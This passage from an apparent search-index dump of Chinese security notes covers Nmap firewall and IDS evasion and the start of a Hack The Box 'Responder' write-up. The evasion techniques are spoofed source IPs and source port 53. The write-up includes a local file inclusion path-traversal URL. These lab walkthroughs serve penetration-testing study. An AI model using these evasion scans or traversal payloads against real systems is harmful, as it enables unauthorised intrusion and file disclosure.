open and 1 closed port\nAggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 4.11 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-p 445</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>-O</code> \u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u626b\u63cf\u3002 <code>-S</code> \u4f7f\u7528\u4e0d\u540c\u7684\u6e90 IP \u5730\u5740\u626b\u63cf\u76ee\u6807\u3002 <code>10.129.2.200</code> \u6307\u5b9a\u6e90IP\u5730\u5740\u3002 <code>-e tun0</code> \u901a\u8fc7\u6307\u5b9a\u63a5\u53e3\u53d1\u9001\u6240\u6709\u8bf7\u6c42\u3002"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#dns","title":"DNS \u4ee3\u7406","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c<code>Nmap</code>\u9664\u975e\u53e6\u6709\u8bf4\u660e\uff0c\u5426\u5219\u6267\u884c\u53cd\u5411 DNS \u89e3\u6790\u4ee5\u67e5\u627e\u6709\u5173\u6211\u4eec\u76ee\u6807\u7684\u66f4\u591a\u91cd\u8981\u4fe1\u606f\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e9b DNS \u67e5\u8be2\u4e5f\u4f1a\u901a\u8fc7\uff0c\u56e0\u4e3a\u5e94\u8be5\u627e\u5230\u5e76\u8bbf\u95ee\u7ed9\u5b9a\u7684 Web \u670d\u52a1\u5668\u3002DNS \u67e5\u8be2\u662f\u901a\u8fc7<code>UDP port 53</code>. \u4ee5\u524d<code>TCP port 53</code>\u4ec5\u7528\u4e8e DNS \u670d\u52a1\u5668\u4e4b\u95f4\u6240\u8c13\u7684\u201c <code>Zone transfers</code>\u201d\u6216\u5927\u4e8e 512 \u5b57\u8282\u7684\u6570\u636e\u4f20\u8f93\u3002\u7531\u4e8e IPv6 \u548c DNSSEC \u6269\u5c55\uff0c\u8fd9\u79cd\u60c5\u51b5\u8d8a\u6765\u8d8a\u591a\u5730\u53d1\u751f\u53d8\u5316\u3002\u8fd9\u4e9b\u66f4\u6539\u5bfc\u81f4\u8bb8\u591a DNS \u8bf7\u6c42\u901a\u8fc7 TCP \u7aef\u53e3 53 \u53d1\u51fa\u3002</p> <p>\u4f46\u662f\uff0c<code>Nmap</code>\u4ecd\u7136\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u79cd\u81ea\u5df1\u6307\u5b9a DNS \u670d\u52a1\u5668\u7684\u65b9\u6cd5 ( <code>--dns-server &lt;ns&gt;,&lt;ns&gt;</code>)\u3002\u5982\u679c\u6211\u4eec\u5904\u4e8e\u975e\u519b\u4e8b\u533a ( <code>DMZ</code>)\uff0c\u8fd9\u79cd\u65b9\u6cd5\u5bf9\u6211\u4eec\u6765\u8bf4\u53ef\u80fd\u662f\u57fa\u672c\u7684\u3002\u516c\u53f8\u7684 DNS \u670d\u52a1\u5668\u901a\u5e38\u6bd4\u6765\u81ea Internet \u7684\u670d\u52a1\u5668\u66f4\u53d7\u4fe1\u4efb\u3002\u56e0\u6b64\uff0c\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\u4e0e\u5185\u90e8\u7f51\u7edc\u7684\u4e3b\u673a\u8fdb\u884c\u4ea4\u4e92\u3002\u4f5c\u4e3a\u53e6\u4e00\u4e2a\u793a\u4f8b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06( ) \u7528\u4f5c\u626b\u63cf\u7684<code>TCP port 53</code>\u6e90\u7aef\u53e3\u3002<code>--source-port</code>\u5982\u679c\u7ba1\u7406\u5458\u4f7f\u7528\u9632\u706b\u5899\u63a7\u5236\u8fd9\u4e2a\u7aef\u53e3\uff0c\u6ca1\u6709\u6b63\u786e\u8fc7\u6ee4IDS/IPS\uff0c\u6211\u4eec\u7684TCP\u6570\u636e\u5305\u5c31\u4f1a\u88ab\u4fe1\u4efb\u5e76\u901a\u8fc7\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#syn","title":"\u8fc7\u6ee4\u7aef\u53e3\u7684 SYN \u626b\u63cf","text":"<p>\u8fc7\u6ee4\u7aef\u53e3\u7684 SYN \u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 22:50 CEST\nSENT (0.0417s) TCP 10.10.14.2:33436 &gt; 10.129.2.28:50000 S ttl=41 id=21939 iplen=44  seq=736533153 win=1024 &lt;mss 1460&gt;\nSENT (1.0481s) TCP 10.10.14.2:33437 &gt; 10.129.2.28:50000 S ttl=46 id=6446 iplen=44  seq=736598688 win=1024 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up.\n\nPORT      STATE    SERVICE\n50000/tcp filtered ibm-db2\n\nNmap done: 1 IP address (1 host up) scanned in 2.06 seconds\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#dns-syn","title":"\u4ece DNS \u7aef\u53e3\u8fdb\u884c SYN \u626b\u63cf","text":"<p>\u4ece DNS \u7aef\u53e3\u8fdb\u884c SYN \u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53\n\nSENT (0.0482s) TCP 10.10.14.2:53 &gt; 10.129.2.28:50000 S ttl=58 id=27470 iplen=44  seq=4003923435 win=1024 &lt;mss 1460&gt;\nRCVD (0.0608s) TCP 10.129.2.28:50000 &gt; 10.10.14.2:53 SA ttl=64 id=0 iplen=44  seq=540635485 win=64240 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up (0.013s latency).\n\nPORT      STATE SERVICE\n50000/tcp open  ibm-db2\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.08 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 50000</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>-sS</code> \u5728\u6307\u5b9a\u7aef\u53e3\u4e0a\u6267\u884c SYN \u626b\u63cf\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>--source-port 53</code> \u4ece\u6307\u5b9a\u7684\u6e90\u7aef\u53e3\u6267\u884c\u626b\u63cf\u3002 <p>\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u53d1\u73b0\u9632\u706b\u5899\u63a5\u53d7<code>TCP port 53</code>\uff0c\u5f88\u53ef\u80fd IDS/IPS \u8fc7\u6ee4\u5668\u7684\u914d\u7f6e\u4e5f\u6bd4\u5176\u4ed6\u8fc7\u6ee4\u5668\u5f31\u5f97\u591a\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5c1d\u8bd5\u4f7f\u7528\u8fde\u63a5\u5230\u8fd9\u4e2a\u7aef\u53e3\u6765\u6d4b\u8bd5\u8fd9\u4e00\u70b9<code>Netcat</code>\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_47","title":"\u8fde\u63a5\u5230\u8fc7\u6ee4\u7aef\u53e3","text":"<p>\u8fde\u63a5\u5230\u8fc7\u6ee4\u7aef\u53e3</p> <pre><code>darkinga@htb[/htb]$ ncat -nv --source-port 53 10.129.2.28 50000\n\nNcat: Version 7.80 ( https://nmap.org/ncat )\nNcat: Connected to 10.129.2.28:50000.\n220 ProFTPd\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/","title":"OGNL\u8868\u8fbe\u5f0f","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_1","title":"\u8bf4\u660e","text":"<p>OGNL\u662fObject-Graph Navigation Language\u7684\u7f29\u5199\uff0c\u5b83\u662f\u4e00\u79cd\u529f\u80fd\u5f3a\u5927\u7684\u8868\u8fbe\u5f0f\u8bed\u8a00\uff0c\u901a\u8fc7\u5b83\u7b80\u5355\u4e00\u81f4\u7684\u8868\u8fbe\u5f0f\u8bed\u6cd5\uff0c\u53ef\u4ee5\u5b58\u53d6\u5bf9\u8c61\u7684\u4efb\u610f\u5c5e\u6027\uff0c\u8c03\u7528\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u904d\u5386\u6574\u4e2a\u5bf9\u8c61\u7684\u7ed3\u6784\u56fe\uff0c\u5b9e\u73b0\u5b57\u6bb5\u7c7b\u578b\u8f6c\u5316\u7b49\u529f\u80fd\u3002\u5b83\u4f7f\u7528\u76f8\u540c\u7684\u8868\u8fbe\u5f0f\u53bb\u5b58\u53d6\u5bf9\u8c61\u7684\u5c5e\u6027\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Responder%20Write-up/","title":"Responder Write-up","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Responder%20Write-up/#introduction","title":"Introduction","text":"<p>Windows \u662f\u5f53\u4eca\u4e16\u754c\u4e0a\u6700\u4e3b\u8981\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u56e0\u4e3a\u5b83\u6613\u4e8e\u4f7f\u7528\u7684 GUI\u53ef\u8bbf\u95ee\u6027\u3002\u5927\u7ea6 85% \u7684\u5e02\u573a\u4efd\u989d\u5df2\u6210\u4e3a\u653b\u51fb\u7684\u5173\u952e\u64cd\u4f5c\u7cfb\u7edf\u3002\u6b64\u5916\uff0c\u5927\u591a\u6570\u7ec4\u7ec7\u4f7f\u7528 Active Directory \u8bbe\u7f6e\u5176 Windows \u57df\u7f51\u7edc\u3002\u5fae\u8f6f\u91c7\u7528 NTLM\uff08\u65b0\u6280\u672f LAN \u7ba1\u7406\u5668\uff09\u548c Kerberos \u7528\u4e8e\u8eab\u4efd\u9a8c\u8bc1\u670d\u52a1\u3002\u5c3d\u7ba1\u5b58\u5728\u5df2\u77e5\u6f0f\u6d1e\uff0c\u5373\u4f7f\u5728\u65b0\u7cfb\u7edf\u4e0aNTLM \u4ecd\u7136\u88ab\u5e7f\u6cdb\u90e8\u7f72\uff0c\u4ee5\u4fdd\u6301\u4e0e\u65e7\u5ba2\u6237\u7aef\u7684\u517c\u5bb9\u6027\u548c\u670d\u52a1\u5668\u3002</p> <p>\u672c\u5b9e\u9a8c\u91cd\u70b9\u4ecb\u7ecd Windows \u673a\u5668\u4e0a\u63d0\u4f9b\u7684\u7f51\u9875\u4e0a\u7684\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5982\u4f55\u5f71\u54cd\u88ab\u5229\u7528\u6765\u6536\u96c6\u8fd0\u884c Web \u670d\u52a1\u5668\u7684\u7528\u6237\u7684 NetNTLMv2 \u8d28\u8be2\u3002\u6211\u4eec\u5c06\u4f7f\u7528\u4e00\u4e2a\u79f0\u4e3a Responder \u7684\u5b9e\u7528\u7a0b\u5e8f\u6765\u6355\u83b7 NetNTLMv2 \u54c8\u5e0c\uff0c\u7136\u540e\u4f7f\u7528\u79f0\u4e3a john the ripper \u7684\u5b9e\u7528\u7a0b\u5e8f\u6d4b\u8bd5\u6570\u4ee5\u767e\u4e07\u8ba1\u7684\u6f5c\u5728\u5bc6\u7801\uff0c\u770b\u770b\u5b83\u4eec\u662f\u5426\u4e0e\u7528\u4e8e\u521b\u5efa\u54c8\u5e0c\u7684\u5bc6\u7801\u5339\u914d\u3002\u6211\u4eec\u4e5f\u5c06\u6df1\u5165\u4e86\u89e3 NTLM \u8eab\u4efd\u9a8c\u8bc1\u7684\u5de5\u4f5c\u8fc7\u7a0b\u4ee5\u53ca\u54cd\u5e94\u7a0b\u5e8f\u5b9e\u7528\u7a0b\u5e8f\u5982\u4f55\u6355\u83b7\u6311\u6218\u3002\u6211\u4eec\u8ba4\u4e3a\uff0c\u4e86\u89e3\u5de5\u5177\u6216\u6846\u67b6\u7684\u5e55\u540e\u5de5\u4f5c\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u5b83\u52a0\u5f3a\u4e86\u7406\u89e3\u7684\u57fa\u7840\uff0c\u6709\u52a9\u4e8e\u5728\u73b0\u5b9e\u4e16\u754c\u4e2d\u5229\u7528\u4eba\u4eec\u53ef\u80fd\u9762\u4e34\u7684\u60c5\u51b5\uff0c\u4e4d\u4e00\u770b\u4f3c\u4e4e\u5e76\u4e0d\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002\u8ba9\u6211\u4eec\u76f4\u63a5\u8fdb\u5165\u5b83\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Responder%20Write-up/#enumeration","title":"Enumeration","text":"<p>\u6211\u4eec\u5c06\u9996\u5148\u626b\u63cf\u4e3b\u673a\u4e0a\u7684\u4efb\u4f55\u5f00\u653e\u7aef\u53e3\u5e76\u4f7f\u7528 Nmap \u626b\u63cf\u8fd0\u884c\u670d\u52a1\u3002 \u6211\u4eec\u5c06\u4f7f\u7528\u4ee5\u4e0b\u6807\u5fd7\u8fdb\u884c\u626b\u63cf\uff1a</p> <pre><code>-p- : This flag scans for all TCP ports ranging from 0-65535\n-sV : Attempts to determine the version of the service running on a port\n--min-rate : This is used to specify the minimum number of packets Nmap should send per\nsecond; it speeds up the scan as the number goes higher\n</code></pre> <pre><code>nmap -p- --min-rate 5000 -sV 10.129.136.91\n</code></pre> <p>Nmap\u5982\u4f55\u5224\u65ad\u7aef\u53e3\u4e0a\u8fd0\u884c\u7684\u670d\u52a1\uff1f Nmap \u4f7f\u7528\u77e5\u540d\u670d\u52a1\u7684\u7aef\u53e3\u670d\u52a1\u6570\u636e\u5e93\u6765\u786e\u5b9a\u670d\u52a1 \u5728\u7279\u5b9a\u7aef\u53e3\u4e0a\u8fd0\u884c\u3002 \u5b83\u7a0d\u540e\u8fd8\u4f1a\u5411\u8be5\u7aef\u53e3\u53d1\u9001\u4e00\u4e9b\u7279\u5b9a\u4e8e\u670d\u52a1\u7684\u8bf7\u6c42\u4ee5 \u786e\u5b9a\u670d\u52a1\u7248\u672c\u548c\u6709\u5173\u5b83\u7684\u4efb\u4f55\u5176\u4ed6\u4fe1\u606f\u3002 \u56e0\u6b64\uff0c\u5bf9\u4e8e\u7279\u5b9a\u7aef\u53e3\u7684\u670d\u52a1\u4fe1\u606f\uff0cNmap \u5927\u90e8\u5206\u4f46\u5e76\u4e0d\u603b\u662f\u6b63\u786e\u3002</p> <p>\ud83d\udca1\u6839\u636e Nmap \u626b\u63cf\u7684\u7ed3\u679c\uff0c\u8be5\u673a\u5668\u4f7f\u7528 Windows \u4f5c\u4e3a\u5176\u64cd\u4f5c\u7cfb\u7edf\u3002 \u4e24\u4e2a\u7aef\u53e3\u88ab\u68c0\u6d4b\u4e3a\u5f00\u653e\uff0cApache Web \u670d\u52a1\u5668\u5728\u7aef\u53e3 80 \u4e0a\u8fd0\u884c\uff0cWinRM \u5728\u7aef\u53e3 5985 \u4e0a\u8fd0\u884c\u3002</p> <p>Windows \u8fdc\u7a0b\u7ba1\u7406\u6216 WinRM \u662f Windows \u539f\u751f\u7684\u5185\u7f6e\u8fdc\u7a0b\u7ba1\u7406\u534f\u8bae \u5b83\u57fa\u672c\u4e0a\u4f7f\u7528\u7b80\u5355\u5bf9\u8c61\u8bbf\u95ee\u534f\u8bae\u4e0e\u8fdc\u7a0b\u8ba1\u7b97\u673a\u548c\u670d\u52a1\u5668\u8fdb\u884c\u4ea4\u4e92\uff0c\u4ee5\u53ca \u64cd\u4f5c\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u3002 WinRM \u5141\u8bb8\u7528\u6237\uff1a \u2192 \u4e0e\u4e3b\u673a\u8fdc\u7a0b\u901a\u4fe1\u548c\u63a5\u53e3 \u2192 \u5728\u975e\u672c\u5730\u4f46\u53ef\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\u7684\u7cfb\u7edf\u4e0a\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u3002 \u2192 \u4ece\u8fdc\u7a0b\u4f4d\u7f6e\u76d1\u63a7\u3001\u7ba1\u7406\u548c\u914d\u7f6e\u670d\u52a1\u5668\u3001\u64cd\u4f5c\u7cfb\u7edf\u548c\u5ba2\u6237\u7aef\u673a\u5668\u3002 \u4f5c\u4e3a\u4e00\u540d\u6e17\u900f\u6d4b\u8bd5\u8005\uff0c\u8fd9\u610f\u5473\u7740\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u5177\u6709\u8fdc\u7a0b\u7ba1\u7406\u6743\u9650\u7684\u7528\u6237\u7684\u51ed\u636e\uff08\u901a\u5e38\u662f\u7528\u6237\u540d\u548c\u5bc6\u7801\uff09\uff0c\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u5728\u4e3b\u673a\u4e0a\u83b7\u5f97\u4e00\u4e2a PowerShell shell\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Responder%20Write-up/#website-enumeration","title":"Website Enumeration","text":"<p>\u5728\u6253\u5f00 Firefox \u5e76\u8f93\u5165 http://[target ip] \u65f6\uff0c\u6d4f\u89c8\u5668\u4f1a\u8fd4\u56de\u4e00\u6761\u5173\u4e8e\u65e0\u6cd5\u627e\u5230\u8be5\u7ad9\u70b9\u7684\u6d88\u606f\u3002\u67e5\u770b URL \u680f\u4e2d\uff0c\u5b83\u73b0\u5728\u663e\u793a http://unika.htb \u3002\u8be5\u7f51\u7ad9\u5df2\u5c06\u6d4f\u89c8\u5668\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u65b0 URL\uff0c\u800c\u60a8\u7684\u4e3b\u673a\u4e0d\u77e5\u9053\u5982\u4f55\u627e\u5230 unika.htb \u3002\u8be5\u7f51\u7edc\u670d\u52a1\u5668\u4f7f\u7528\u57fa\u4e8e\u540d\u79f0\u7684\u865a\u62df\u4e3b\u673a\u6765\u670d\u52a1\u8bf7\u6c42\u3002\u57fa\u4e8e\u540d\u79f0\u7684\u865a\u62df\u4e3b\u673a\u662f\u4e00\u79cd\u5728\u5355\u4e2a\u670d\u52a1\u5668\u4e0a\u6258\u7ba1\u591a\u4e2a\u57df\u540d\uff08\u6bcf\u4e2a\u540d\u79f0\u5206\u522b\u5904\u7406\uff09\u7684\u65b9\u6cd5\u3002\u8fd9\u5141\u8bb8\u4e00\u53f0\u670d\u52a1\u5668\u5171\u4eab\u5176\u8d44\u6e90\uff0c\u4f8b\u5982\u5185\u5b58\u548c\u5904\u7406\u5668\u5468\u671f\uff0c\u800c\u4e0d\u9700\u8981\u6240\u6709\u670d\u52a1\u90fd\u7531\u76f8\u540c\u7684\u4e3b\u673a\u540d\u4f7f\u7528\u3002 Web \u670d\u52a1\u5668\u68c0\u67e5 HTTP \u8bf7\u6c42\u7684 Host \u6807\u5934\u5b57\u6bb5\u4e2d\u63d0\u4f9b\u7684\u57df\u540d\uff0c\u5e76\u636e\u6b64\u53d1\u9001\u54cd\u5e94\u3002 /etc/hosts \u6587\u4ef6\u7528\u4e8e\u5c06\u4e3b\u673a\u540d\u89e3\u6790\u4e3a IP \u5730\u5740\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5728 /etc/hosts \u6587\u4ef6\u4e2d\u4e3a\u8be5\u57df\u6dfb\u52a0\u4e00\u4e2a\u6761\u76ee\uff0c\u4ee5\u4f7f\u6d4f\u89c8\u5668\u80fd\u591f\u89e3\u6790 unika.htb \u7684\u5730\u5740\u3002 /etc/hosts \u6587\u4ef6\u4e2d\u7684\u6761\u76ee\uff1a</p> <pre><code>echo \"10.129.107.98 unika.htb\" | sudo tee -a /etc/hosts\n</code></pre> <p>\u5728 /etc/hosts \u6587\u4ef6\u4e2d\u6dfb\u52a0\u6b64\u6761\u76ee\u5c06\u4f7f\u6d4f\u89c8\u5668\u80fd\u591f\u5c06\u4e3b\u673a\u540d unika.htb \u89e3\u6790\u4e3a\u76f8\u5e94\u7684 IP \u5730\u5740\uff0c\u4ece\u800c\u4f7f\u6d4f\u89c8\u5668\u5728\u6d4f\u89c8\u5668\u53d1\u9001\u7ed9\u6b64\u7684\u6bcf\u4e2a HTTP \u8bf7\u6c42\u4e2d\u5305\u542b HTTP \u6807\u5934 Host: unika.htb IP \u5730\u5740\uff0c\u8fd9\u5c06\u4f7f\u670d\u52a1\u5668\u54cd\u5e94 unika.htb \u7684\u7f51\u9875\u3002 \u5728\u8bbf\u95ee\u7f51\u9875\u65f6\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u4e00\u4e2a\u7f51\u9875\u8bbe\u8ba1\u4e1a\u52a1\u767b\u5f55\u9875\u9762\u3002</p> <p></p> <p>\u68c0\u67e5\u8be5\u7ad9\u70b9\uff0c\u6211\u4eec\u6ca1\u6709\u770b\u5230\u4efb\u4f55\u7279\u522b\u611f\u5174\u8da3\u7684\u5185\u5bb9\u3002 \u867d\u7136\uff0c\u6211\u4eec\u6ce8\u610f\u5230\u5bfc\u822a\u680f EN \u4e0a\u6709\u4e00\u4e2a\u8bed\u8a00\u9009\u62e9\u9009\u9879\uff0c\u5c06\u9009\u9879\u66f4\u6539\u4e3a FR \u4f1a\u5c06\u6211\u4eec\u5e26\u5230\u6cd5\u8bed\u7248\u672c\u7684\u7f51\u7ad9\u3002</p> <p></p> <p>\u6ce8\u610f\u5230 URL\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 french.html \u9875\u9762\u6b63\u5728\u7531 page \u53c2\u6570\u52a0\u8f7d\uff0c\u5982\u679c\u9875\u9762\u8f93\u5165\u672a\u7ecf\u8fc7\u8fc7\u6ee4\uff0c\u5219\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u672c\u5730\u6587\u4ef6\u5305\u542b (LFI) \u6f0f\u6d1e\u7684\u653b\u51fb\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Responder%20Write-up/#file-inclusion-vulnerability","title":"File Inclusion Vulnerability","text":"<p>\u52a8\u6001\u7f51\u7ad9\u5305\u62ec\u4f7f\u7528\u6765\u81ea HTTP \u8bf7\u6c42\u7684\u4fe1\u606f\u7684\u52a8\u6001 HTML \u9875\u9762\uff0c\u5305\u62ec GET \u548c POST \u53c2\u6570\u3001cookie \u548c\u5176\u4ed6\u53d8\u91cf\u3002\u4e00\u4e2a\u9875\u9762\u901a\u5e38\u4f1a\u6839\u636e\u5176\u4e2d\u4e00\u4e9b\u53c2\u6570\u201c\u5305\u542b\u201d\u53e6\u4e00\u4e2a\u9875\u9762\u3002</p> <p>LFI \u6216\u672c\u5730\u6587\u4ef6\u5305\u542b\u53d1\u751f\u5728\u653b\u51fb\u8005\u80fd\u591f\u8ba9\u7f51\u7ad9\u5305\u542b\u4e0d\u6253\u7b97\u6210\u4e3a\u6b64\u5e94\u7528\u7a0b\u5e8f\u9009\u9879\u7684\u6587\u4ef6\u65f6\u3002\u4e00\u4e2a\u5e38\u89c1\u7684\u4f8b\u5b50\u662f\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u6587\u4ef6\u7684\u8def\u5f84\u4f5c\u4e3a\u8f93\u5165\u3002\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u5c06\u6b64\u8f93\u5165\u89c6\u4e3a\u53ef\u4fe1\u8f93\u5165\uff0c\u5e76\u4e14\u672a\u5bf9\u6b64\u8f93\u5165\u6267\u884c\u6240\u9700\u7684\u536b\u751f\u68c0\u67e5\uff0c\u5219\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u8f93\u5165\u6587\u4ef6\u540d\u4e2d\u7684 ../ \u5b57\u7b26\u4e32\u6765\u5229\u7528\u5b83\uff0c\u5e76\u6700\u7ec8\u67e5\u770b\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u654f\u611f\u6587\u4ef6\u3002\u5728\u67d0\u4e9b\u6709\u9650\u7684\u60c5\u51b5\u4e0b\uff0cLFI \u4e5f\u53ef\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002</p> <p>RFI \u6216\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u7c7b\u4f3c\u4e8e LFI\uff0c\u4f46\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528 HTTP\u3001FTP \u7b49\u534f\u8bae\u5728\u4e3b\u673a\u4e0a\u52a0\u8f7d\u8fdc\u7a0b\u6587\u4ef6\u3002</p> <p>\u6211\u4eec\u6d4b\u8bd5\u9875\u9762\u53c2\u6570\u4ee5\u67e5\u770b\u662f\u5426\u53ef\u4ee5\u5728\u670d\u52a1\u5668\u54cd\u5e94\u4e2d\u5305\u542b\u76eed\u6807\u7cfb\u7edf\u4e0a\u7684\u6587\u4ef6\u3002\u6211\u4eec\u5c06\u4f7f\u7528\u4e00\u4e9b\u5728\u7f51\u7edc\u3001Windows \u57df\u548c\u7cfb\u7edf\u4e2d\u5177\u6709\u76f8\u540c\u540d\u79f0\u7684\u4f17\u6240\u5468\u77e5\u7684\u6587\u4ef6\u8fdb\u884c\u6d4b\u8bd5\uff0c\u8fd9\u4e9b\u6587\u4ef6\u53ef\u4ee5\u5728\u6b64\u5904\u627e\u5230\u3002\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u5728 Windows \u673a\u5668\u4e0a\u8bbf\u95ee\u4ee5\u9a8c\u8bc1 LFI \u7684\u6700\u5e38\u89c1\u6587\u4ef6\u4e4b\u4e00\u662f\u4e3b\u673a\u6587\u4ef6 WINDOWS\\System32\\drivers\\etc\\hosts\uff08\u8be5\u6587\u4ef6\u6709\u52a9\u4e8e\u5c06\u4e3b\u673a\u540d\u672c\u5730\u8f6c\u6362\u4e3a IP \u5730\u5740\uff09 . ../ \u5b57\u7b26\u4e32\u7528\u4e8e\u904d\u5386\u4e00\u4e2a\u76ee\u5f55\uff0c\u4e00\u6b21\u4e00\u4e2a\u3002\u56e0\u6b64\uff0c\u591a\u4e2a ../ \u5b57\u7b26\u4e32\u5305\u542b\u5728 URL \u4e2d\uff0c\u4ee5\u4fbf\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u5904\u7406\u7a0b\u5e8f\u904d\u5386\u56de\u57fa\u672c\u76ee\u5f55\uff0c\u5373 C:\\ \u3002</p> <pre><code>http://unika.htb/index.php?\npage=../../../../../../../../windows/system32/drivers/etc/hosts\n</code></pre> <p></p> <p>\u592a\u597d\u4e86\uff0cLFI \u662f\u53ef\u80fd\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u53ef\u4ee5\u5728\u54cd\u5e94\u4e2d\u67e5\u770b C:\\windows\\system32\\drivers\\etc\\hosts \u6587\u4ef6\u7684\u5185\u5bb9\u3002</p> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6587\u4ef6\u5305\u542b\u4e4b\u6240\u4ee5\u6210\u4e3a\u53ef\u80fd\uff0c\u662f\u56e0\u4e3a\u5728\u540e\u7aef PHP \u7684 include() \u65b9\u6cd5\u88ab\u7528\u4e8e\u5904\u7406 URL \u53c2\u6570\u9875\u9762\uff0c\u4ee5\u4fbf\u4e3a\u4e0d\u540c\u8bed\u8a00\u63d0\u4f9b\u4e0d\u540c\u7684\u7f51\u9875\u3002 